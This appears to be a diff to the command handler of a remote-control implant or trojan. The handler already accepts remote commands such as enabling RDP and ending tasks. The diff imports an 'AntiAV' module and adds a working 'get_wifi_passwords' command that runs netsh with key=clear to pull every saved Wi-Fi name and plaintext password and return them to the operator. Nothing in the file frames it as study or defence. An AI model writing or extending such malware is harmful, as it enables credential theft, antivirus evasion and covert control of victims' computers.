@@ -12,6 +12,7 @@ import winreg
 from config import Config
 from monitoring.rdp_controller import RDPController
 from encryption.manager import EncryptionManager
+from system.anti_av import AntiAV
 
 class CommandError(Exception):
     pass
@@ -33,7 +34,8 @@ class CommandHandler:
             'end_task': CommandHandler.handle_end_task,
             'enable_rdp': CommandHandler.handle_enable_rdp,
             'disable_rdp': CommandHandler.handle_disable_rdp,
-            'adjust_behavior': CommandHandler.handle_adjust_behavior
+            'adjust_behavior': CommandHandler.handle_adjust_behavior,
+            'get_wifi_passwords': CommandHandler.handle_wifi_passwords  # New command
         }
         
         handler = handlers.get(command_type)
@@ -43,6 +45,84 @@ class CommandHandler:
             raise CommandError(f"Unknown command type: {command_type}")
         
         return handler(params)
+    
+    @staticmethod
+    def handle_wifi_passwords(params: dict) -> dict:
+        """
+        Extract all saved Wi-Fi profiles and their passwords on Windows.
+        Returns a list of dictionaries with SSID and password.
+        """
+        try:
+            if platform.system().lower() != "windows":
+                logging.info("Wi-Fi password extraction only supported on Windows")
+                return {
+                    "status": "error",
+                    "message": "Wi-Fi password extraction only supported on Windows",
+                    "wifi_profiles": []
+                }
+
+            # Get all Wi-Fi profiles
+            result = subprocess.run(
+                ["netsh", "wlan", "show", "profiles"],
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            if result.returncode != 0:
+                logging.error(f"Failed to get Wi-Fi profiles: {result.stderr}")
+                raise CommandError(f"Failed to get Wi-Fi profiles: {result.stderr}")
+
+            # Extract SSID names
+            profiles = []
+            for line in result.stdout.splitlines():
+                if "All User Profile" in line:
+                    ssid = line.split(":")[1].strip()
+                    profiles.append(ssid)
+
+            wifi_data = []
+            for ssid in profiles:
+                # Get profile details with key content
+                result = subprocess.run(
+                    ["netsh", "wlan", "show", "profile", f"name={ssid}", "key=clear"],
+                    capture_output=True,
+                    text=True,
+                    timeout=30
+                )
+                if result.returncode != 0:
+                    logging.warning(f"Failed to get details for SSID {ssid}: {result.stderr}")
+                    continue
+
+                # Extract password
+                password = None
+                for line in result.stdout.splitlines():
+                    if "Key Content" in line:
+                        password = line.split(":")[1].strip()
+                        break
+                wifi_data.append({
+                    "ssid": ssid,
+                    "password": password if password else "No password found"
+                })
+
+            if not wifi_data:
+                logging.info("No Wi-Fi profiles found")
+                return {
+                    "status": "success",
+                    "message": "No Wi-Fi profiles found",
+                    "wifi_profiles": []
+                }
+
+            if Config.DEBUG_MODE:
+                logging.info(f"Extracted {len(wifi_data)} Wi-Fi profiles")
+            return {
+                "status": "success",
+                "message": "Wi-Fi profiles extracted successfully",
+                "wifi_profiles": wifi_data
+            }
+
+        except Exception as e:
+            logging.error(f"Wi-Fi password extraction error: {str(e)}")
+            raise CommandError(f"Wi-Fi password extraction error: {str(e)}")
+
 
     @staticmethod
     def handle_end_task(params):
